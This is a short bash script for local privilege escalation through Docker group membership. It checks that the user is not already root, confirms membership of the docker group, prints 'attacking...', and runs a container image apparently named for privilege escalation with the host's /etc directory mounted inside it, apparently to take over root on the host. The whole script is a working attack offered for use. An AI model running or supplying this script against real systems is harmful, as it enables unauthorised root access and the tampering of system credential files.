#!/bin/bash

if [ $(id -u) -eq 0 ]; then
    echo "Already root"
    exit
fi

if groups $USER |grep -q docker; then
    echo "User $USER in docker group, attacking..."
    docker run -it -v /etc:/root krustyhack/docker-privesc
else
    echo "User $USER not in docker group, abort."
fi
